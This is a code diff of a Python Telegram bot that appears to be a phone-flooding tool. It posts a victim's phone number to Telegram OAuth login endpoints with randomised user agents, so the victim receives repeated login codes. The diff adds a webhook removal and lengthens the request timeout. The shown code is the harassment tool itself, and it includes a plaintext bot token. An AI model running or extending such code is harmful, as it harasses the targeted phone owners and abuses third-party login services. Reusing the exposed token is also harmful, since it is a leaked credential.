@@ -4,6 +4,7 @@ from fake_useragent import UserAgent
 import threading
 
 bot = telebot.TeleBot("8736392114:AAFbnaTe3ZLkjCP2Pu7bQnPm2sEMYPV6RUU")
+bot.remove_webhook()
 
 endpoints = [
     'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
@@ -53,7 +54,7 @@ def handle(m):
                 try:
                     headers = {'user-agent': ua.random}
                     data = {'phone': phone}
-                    requests.post(ep, headers=headers, data=data, timeout=3)
+                    requests.post(ep, headers=headers, data=data, timeout=5)
                 except:
                     pass
 
